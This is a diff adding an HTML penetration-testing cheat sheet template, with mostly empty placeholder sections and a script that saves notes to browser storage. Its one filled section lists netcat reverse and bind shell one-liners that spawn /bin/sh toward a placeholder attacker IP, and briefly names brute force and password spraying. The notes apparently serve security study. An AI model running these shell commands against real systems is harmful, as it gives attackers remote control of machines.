@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Testing Cheat Sheet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        h2 {
+            color: #333;
+            border-bottom: 2px solid #333;
+            padding-bottom: 5px;
+            margin-bottom: 20px;
+        }
+        ul {
+            list-style-type: disc;
+            padding-left: 20px;
+        }
+        a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        pre {
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <h1>Penetration Testing Cheat Sheet</h1>
+
+    <h2>Enumeration Techniques:</h2>
+    <pre id="arp-scan-netdiscover">
+Paste information about arp-scan and netdiscover here...
+    </pre>
+
+    <h2>Basic nmap Scan:</h2>
+    <pre id="nmap-scan">
+Paste information about basic nmap scan here...
+    </pre>
+
+    <h2>Nikto:</h2>
+    <pre id="nikto">
+Paste information about Nikto here...
+    </pre>
+
+    <h2>SMB Enumeration:</h2>
+    <pre id="smb-enumeration">
+Paste information about SMB Enumeration here...
+    </pre>
+
+    <h2>SSH Enumeration:</h2>
+    <pre id="ssh-enumeration">
+Paste information about SSH Enumeration here...
+    </pre>
+
+    <h2>Nessus Scan:</h2>
+    <pre id="nessus-scan">
+Paste information about Nessus Scan here...
+    </pre>
+
+    <h2>Exploitation Basics and Shells:</h2>
+    <pre id="exploitation-basics">
+Exploitation is a critical aspect of penetration testing, involving the utilization of vulnerabilities to gain unauthorized access to systems. Understanding the fundamental concepts of exploitation is essential for effective security assessment and mitigation.
+
+Most Common Shell: Reverse Shell is the predominant method, utilized approximately 95% of the time. It involves the victim connecting back to the attacker's machine, enabling remote access.
+Netcat Reverse Shell: The victim initiates a connection to the attacker's machine.
+Attack Box: nc -lvp {port}: Netcat listens for incoming connections with verbosity enabled on the specified port.
+Target Box: nc {Attacker IP} {port} -e /bin/sh: Netcat connects to the attacker's IP address on the specified port and spawns a shell.
+Netcat Bind Shell: The attacker connects directly to the victim's machine.
+Attack Box: nc {Target IP} {port}: Initiates a connection to the target on the specified port.
+Target Box: nc -lvp {port} -e /bin/sh: Netcat listens for incoming connections on the specified port and spawns a shell.
+Reverse vs. Bind Shells: Provides insight into the differences and use cases for reverse and bind shells.
+Payload Types:
+Staged vs. Non-staged Payloads: Differentiates between staged and non-staged payloads and their implications in exploitation.
+Gaining Root Access:
+Gaining Root with Metasploit: Explains how to escalate privileges and gain root access using Metasploit framework.
+Manual Exploitation:
+Manual Exploitation: Covers the process of manually exploiting vulnerabilities without automated tools, often necessary for tailored attacks.
+Brute Force Attacks:
+Brute Force Attacks: Describes brute force techniques for gaining access to systems, particularly useful for cracking passwords.
+Credential Stuffing and Password Spraying:
+Credential Stuffing and Password Spraying: Discusses credential stuffing and password spraying attacks, which involve the automated testing of known credentials or commonly used passwords against multiple accounts.
+
+    </pre>
+
+    <h2>Exploitation Tools:</h2>
+    <pre id="exploitation-tools">
+Paste information about exploitation tools here...
+    </pre>
+
+    <h2>Active Directory (AD) Attack Vectors:</h2>
+    <pre id="ad-attack-vectors">
+Paste information about AD attack vectors here...
+    </pre>
+
+    <h2>Post-Domain Attack Strategies:</h2>
+    <pre id="post-domain-attack-strategies">
+Paste information about post-domain attack strategies here...
+    </pre>
+
+    <h2>Post Compromise AD Enumeration:</h2>
+    <pre id="post-compromise-ad-enumeration">
+Paste information about post-compromise AD enumeration here...
+    </pre>
+
+    <h2>AD Post-Compromise Attacks:</h2>
+    <pre id="ad-post-compromise-attacks">
+Paste information about AD post-compromise attacks here...
+    </pre>
+
+    <h2>Additional AD Attacks:</h2>
+    <pre id="additional-ad-attacks">
+Paste information about additional AD attacks here...
+    </pre>
+
+    <h2>Post Exploitation:</h2>
+    <pre id="post-exploitation">
+Paste information about post-exploitation here...
+    </pre>
+
+    <h2>Web Application Enumeration:</h2>
+    <pre id="web-application-enumeration">
+Paste information about web application enumeration here...
+    </pre>
+
+    <script>
+        // JavaScript to save user input to local storage
+        document.addEventListener('DOMContentLoaded', function() {
+            // Load saved data if available
+            document.getElementById('arp-scan-netdiscover').innerText = localStorage.getItem('arp-scan-netdiscover') || 'Paste information about arp-scan and netdiscover here...';
+            document.getElementById('nmap-scan').innerText = localStorage.getItem('nmap-scan') || 'Paste information about basic nmap scan here...';
+            document.getElementById('nikto').innerText = localStorage.getItem('nikto') || 'Paste information about Nikto here...';
+            document.getElementById('smb-enumeration').innerText = localStorage.getItem('smb-enumeration') || 'Paste information about SMB Enumeration here...';
+            document.getElementById('ssh-enumeration').innerText = localStorage.getItem('ssh-enumeration') || 'Paste information about SSH Enumeration here...';
+            document.getElementById('nessus-scan').innerText = localStorage.getItem('nessus-scan') || 'Paste information about Nessus Scan here...';
+            document.getElementById('exploitation-basics').innerText = localStorage.getItem('exploitation-basics') || 'Paste information about exploitation basics and shells here...';
+            document.getElementById('exploitation-tools').innerText = localStorage.getItem('exploitation-tools') || 'Paste information about exploitation tools here...';
+            document.getElementById('ad-attack-vectors').innerText = localStorage.getItem('ad-attack-vectors') || 'Paste information about AD attack vectors here...';
+            document.getElementById('post-domain-attack-strategies').innerText = localStorage.getItem('post-domain-attack-strategies') || 'Paste information about post-domain attack strategies here...';
+            document.getElementById('post-compromise-ad-enumeration').innerText = localStorage.getItem('post-compromise-ad-enumeration') || 'Paste information about post-compromise AD enumeration here...';
+            document.getElementById('ad-post-compromise-attacks').innerText = localStorage.getItem('ad-post-compromise-attacks') || 'Paste information about AD post-compromise attacks here...';
+            document.getElementById('additional-ad-attacks').innerText = localStorage.getItem('additional-ad-attacks') || 'Paste information about additional AD attacks here...';
+            document.getElementById('post-exploitation').innerText = localStorage.getItem('post-exploitation') || 'Paste information about post-exploitation here...';
+            document.getElementById('web-application-enumeration').innerText = localStorage.getItem('web-application-enumeration') || 'Paste information about web application enumeration here...';
+
+            // Save data when user leaves the page
+            window.addEventListener('beforeunload', function() {
+                localStorage.setItem('arp-scan-netdiscover', document.getElementById('arp-scan-netdiscover').innerText);
+                localStorage.setItem('nmap-scan', document.getElementById('nmap-scan').innerText);
+                localStorage.setItem('nikto', document.getElementById('nikto').innerText);
+                localStorage.setItem('smb-enumeration', document.getElementById('smb-enumeration').innerText);
+                localStorage.setItem('ssh-enumeration', document.getElementById('ssh-enumeration').innerText);
+                localStorage.setItem('nessus-scan', document.getElementById('nessus-scan').innerText);
+                localStorage.setItem('exploitation-basics', document.getElementById('exploitation-basics').innerText);
+                localStorage.setItem('exploitation-tools', document.getElementById('exploitation-tools').innerText);
+                localStorage.setItem('ad-attack-vectors', document.getElementById('ad-attack-vectors').innerText);
+                localStorage.setItem('post-domain-attack-strategies', document.getElementById('post-domain-attack-strategies').innerText);
+                localStorage.setItem('post-compromise-ad-enumeration', document.getElementById('post-compromise-ad-enumeration').innerText);
+                localStorage.setItem('ad-post-compromise-attacks', document.getElementById('ad-post-compromise-attacks').innerText);
+                localStorage.setItem('additional-ad-attacks', document.getElementById('additional-ad-attacks').innerText);
+                localStorage.setItem('post-exploitation', document.getElementById('post-exploitation').innerText);
+                localStorage.setItem('web-application-enumeration', document.getElementById('web-application-enumeration').innerText);
+            });
+        });
+    </script>
+</body>
+</html>
